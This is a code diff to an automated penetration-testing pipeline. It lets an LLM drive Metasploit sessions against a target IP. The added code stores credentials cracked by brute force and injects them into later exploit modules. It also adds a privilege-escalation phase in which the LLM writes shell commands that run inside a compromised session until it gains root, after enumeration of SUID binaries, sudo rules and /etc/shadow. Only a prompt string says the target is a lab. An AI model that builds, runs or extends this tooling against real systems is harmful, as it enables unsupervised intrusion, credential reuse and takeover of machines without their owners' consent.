@@ -67,6 +67,7 @@ class PentestPipeline(PipelineBase):
         self.open_ports = {} 
         self.session_id = None
         self.manual_access = None  # TIER C: foothold manual (sem sessao MSF)
+        self.found_creds = []  # creds obtidas (brute) p/ reuso e chaining
         self.evidence = {}
     
     def check_port(self, port):
@@ -368,6 +369,10 @@ If the output above already proves execution on the target, set done=true.
         while attack_queue:
             port, banner, fail_note, tried = attack_queue.pop(0)
             _prev_note = ""
+            creds_block = ""
+            if self.found_creds:
+                _cl = [f"{c['user']}:{c['pass']} (port {c['port']} {c['service']})" for c in self.found_creds[:8]]
+                creds_block = "AVAILABLE CREDENTIALS (already obtained; REUSE across services and for authenticated modules): " + "; ".join(_cl)
             if tried:
                 _prev_note = (
                     "\n            PREVIOUS ATTEMPTS ON THIS PORT (already tried: "
@@ -421,6 +426,7 @@ If the output above already proves execution on the target, set done=true.
             SERVICE BANNER:
             "{banner}"
             {_prev_note}
+            {creds_block}
             
             ----------------------------------------
             KNOWLEDGE BASE (RAG)
@@ -596,6 +602,8 @@ If the output above already proves execution on the target, set done=true.
             opts = {"RHOSTS": self.target_ip, "RPORT": int(port)}
             opts.update(llm_options) 
             
+            if strategy in ("exploit_cve", "enumeration"):
+                self._inject_creds(m_type, m_name, opts, port)
             if strategy != "skip":
                 print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
             
@@ -611,6 +619,9 @@ If the output above already proves execution on the target, set done=true.
                                                  user_file=wl["user_file"],
                                                  pass_file=wl["pass_file"]) or ""
                 creds = re.findall(r"(?:Success|Login Successful|succeeded)[^\n]*", out)
+                for _cl in creds:
+                    _m = re.search(r"'([^':]+):([^']*)'", _cl)
+                    if _m: self._add_cred(port, banner, _m.group(1), _m.group(2))
                 sid = self._max_sid()
                 if sid and sid != before_sid:
                     self.session_id = sid
@@ -755,9 +766,128 @@ If the output above already proves execution on the target, set done=true.
                 print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                 break
         
-        if self.session_id: self.phase_4_post_exploitation()
+        if self.session_id:
+            self.phase_4_post_exploitation()
+            self.phase_5_privesc()
         self.store_attack_experience()
         self.generate_text_report()
+
+    def _add_cred(self, port, banner, user, pwd):
+        """Guarda uma credencial valida obtida no brute para reuso/chaining."""
+        svc = (self.services.get(port, {}).get("service", "") or banner or "")[:40]
+        rec = {"port": port, "service": svc, "user": user, "pass": pwd}
+        if rec not in self.found_creds:
+            self.found_creds.append(rec)
+            print(f"{C_GREEN}[CRED+] guardada {user}:{pwd} (porta {port}) para reuso/chaining{C_RESET}")
+
+    def _inject_creds(self, m_type, m_name, opts, port):
+        """Rede de seguranca: se ha credenciais obtidas e o modulo aceita nomes de
+        opcao de credencial ainda nao preenchidos, injeta a melhor cred (prefere a
+        do mesmo port). So age quando o modulo REALMENTE tem essas opcoes."""
+        if not self.found_creds:
+            return
+        cred = next((c for c in reversed(self.found_creds) if str(c["port"]) == str(port)),
+                    self.found_creds[-1])
+        try:
+            names = set(self.msf.module_option_names(m_type, m_name))
+        except Exception:
+            names = set()
+        for u, p in (("USERNAME", "PASSWORD"), ("USER", "PASS"),
+                     ("SMBUser", "SMBPass"), ("FTPUSER", "FTPPASS"),
+                     ("DB_USERNAME", "DB_PASSWORD")):
+            if u in names and p in names:
+                if not opts.get(u):
+                    opts[u] = cred["user"]
+                if not opts.get(p):
+                    opts[p] = cred["pass"]
+                print(f"{C_BLUE}[CRED-INJECT] {u}/{p} = {cred['user']}:{cred['pass']} (cred obtida reutilizada){C_RESET}")
+                break
+
+    def phase_5_privesc(self, max_rounds=4):
+        """FASE 5: se a sessao e de baixo privilegio (uid != 0), o LLM AUTORA
+        comandos de escalonamento executados NA SHELL da sessao MSF ate uid=0."""
+        if not self.session_id:
+            return False
+        info = self.evidence.get("shell_info", "") or ""
+        if "uid=0(root)" in info:
+            print(f"{C_GREEN}[PRIVESC] Ja e root (uid=0); escalonamento desnecessario.{C_RESET}")
+            return True
+        print(f"\n>>> [FASE 5] ESCALONAMENTO DE PRIVILEGIO (uid != 0)")
+
+        def sh(cmd, wait=4):
+            try:
+                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
+                time.sleep(wait)
+                res = self.msf.client.call('session.shell_read', [self.session_id])
+                return (res or {}).get('data', '') or ''
+            except Exception as e:
+                return f"[erro shell: {e}]"
+
+        enum = sh("id; uname -a; sudo -n -l 2>/dev/null; "
+                  "find / -perm -4000 -type f 2>/dev/null | head -40; "
+                  "ls -l /etc/passwd /etc/shadow 2>/dev/null; which gcc python perl", wait=6)
+        print(f"{C_CYAN}{enum}{C_RESET}")
+
+        rag_ctx = ""
+        if self.use_rag and self.rag:
+            try:
+                docs = self.rag.query("linux privilege escalation SUID sudo kernel cron "
+                                      "writable passwd root uid 0 gtfobins", k=5)
+                rag_ctx = "\n\n".join(d.page_content for d in docs[:5])
+            except Exception:
+                pass
+
+        history = [("initial enumeration", enum)]
+        for rnd in range(1, max_rounds + 1):
+            hist_txt = "\n".join(f"$ {c}\n{o[:600]}" for c, o in history[-4:])
+            prompt = f"""
+YOU ARE A PENTESTER escalating from a low-priv shell to ROOT on {self.target_ip}
+(CONTROLLED LAB). You run commands INSIDE the compromised shell (uid != 0).
+
+ENUMERATION AND HISTORY SO FAR:
+{hist_txt}
+
+KNOWLEDGE BASE (RAG):
+{rag_ctx}
+
+Author shell commands to escalate to uid=0(root). Prefer NON-INTERACTIVE one-liners
+(no vim/less/--interactive in a non-tty shell). Consider: sudo NOPASSWD, SUID
+GTFObins, world-writable /etc/passwd, cron, or a gcc kernel PoC (only if gcc exists).
+
+Return JSON ONLY:
+{{"commands": ["cmd1", "cmd2"], "success_check": "uid=0", "done": false, "reason": "what/why"}}
+If the history already shows uid=0(root), set done=true.
+"""
+            resp = self.ask_llm_robust(prompt)
+            if not resp:
+                print(f"{C_RED}[PRIVESC] LLM sem resposta.{C_RESET}")
+                break
+            try:
+                if "{" in resp:
+                    resp = resp[resp.find("{"):resp.rfind("}") + 1]
+                plan = json.loads(resp)
+            except Exception:
+                print(f"{C_RED}[PRIVESC] JSON invalido do LLM.{C_RESET}")
+                break
+            print(f"{C_BLUE}[PRIVESC] {plan.get('reason', '(sem motivo)')}{C_RESET}")
+            check = (plan.get("success_check") or "uid=0").strip()
+            cmds = plan.get("commands") or []
+            if plan.get("done") and not cmds:
+                break
+            for cmd in cmds:
+                print(f"{C_YELLOW}[PRIVESC] $ {cmd}{C_RESET}")
+                out = sh(cmd, wait=5)
+                verify = sh("id", wait=2)
+                combined = out + verify
+                print(f"{C_CYAN}{out}{C_RESET}")
+                history.append((cmd, combined))
+                if "uid=0(root)" in combined:
+                    print(f"{C_GREEN}[***] ROOT! Escalonamento bem-sucedido via: {cmd}{C_RESET}")
+                    self.evidence["privesc"] = {"command": cmd, "output": combined[:1500]}
+                    self.history.append(f"[PRIVESC ROOT] sessao {self.session_id}: {cmd}")
+                    return True
+        print(f"{C_RED}[PRIVESC] Nao escalou para root nesta execucao.{C_RESET}")
+        return False
 
     def phase_4_post_exploitation(self):
         print(f"\n>>> [FASE 4] POST-EXPLORACAO")
